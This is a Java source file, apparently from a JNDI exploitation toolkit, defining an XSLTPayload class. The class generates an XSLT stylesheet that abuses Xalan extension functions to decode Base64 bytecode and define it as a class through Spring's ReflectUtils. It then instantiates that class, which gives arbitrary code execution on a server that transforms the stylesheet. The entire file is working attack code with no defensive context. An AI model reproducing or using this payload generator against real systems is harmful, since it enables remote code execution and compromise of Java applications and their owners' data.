package map.jndi.payload;

import java.util.Base64;

public class XSLTPayload {
    public static String loadClass(String className, byte[] byteCode) {
        return "<xsl:stylesheet version=\"1.0\"" +
                "  xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"" +
                "  xmlns:b64=\"http://xml.apache.org/xalan/java/java.util.Base64\"" +
                "  xmlns:de=\"http://xml.apache.org/xalan/java/java.util.Base64$Decoder\"" +
                "  xmlns:ob=\"http://xml.apache.org/xalan/java/java.lang.Object\"" +
                "  xmlns:th=\"http://xml.apache.org/xalan/java/java.lang.Thread\"" +
                "  xmlns:ru=\"http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils\"" +
                "  xmlns:cls=\"http://xml.apache.org/xalan/java/java.lang.Class\"" +
                "  exclude-result-prefixes=\"b64 de ob th ru cls\">" +
                "  <xsl:template match=\"/\">" +
                "    <xsl:variable name=\"dec\" select=\"b64:getDecoder()\"/>" +
                "    <xsl:variable name=\"bs\" select=\"de:decode($dec, '" + Base64.getEncoder().encodeToString(byteCode) + "')\"/>" +
                "    <xsl:variable name=\"cl\" select=\"th:getContextClassLoader(th:currentThread())\"/>" +
                "    <xsl:variable name=\"clazz\" select=\"ru:defineClass('" + className + "', $bs, $cl)\"/>" +
                "   <xsl:variable name=\"inst\" select=\"cls:newInstance($clazz)\"/>" +
                "    <xsl:value-of select=\"$inst\"/>" +
                "  </xsl:template>" +
                "</xsl:stylesheet>";
    }
}
